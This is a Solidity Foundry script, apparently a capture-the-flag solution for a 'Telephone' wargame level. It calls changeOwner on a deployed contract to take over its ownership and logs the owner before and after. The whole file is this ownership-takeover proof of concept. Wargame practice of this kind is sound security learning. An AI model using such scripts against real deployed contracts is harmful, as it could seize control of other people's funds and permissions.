pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../contracts/Telephone.sol";

contract TelephonePOC is Script {

    Telephone private level4 = Telephone(0xaFa652290a2Cf829Cf47ae01859F2fA1E493fa1F);

    function run() external {
        vm.startBroadcast(address(this));
        console.log("Owner is:", level4.owner());
        level4.changeOwner(0x9D95B165eCefa55c21Df4cFfc9718781d36B4A6c);
        console.log("New Owner is:", level4.owner());
        vm.stopBroadcast();
    }
}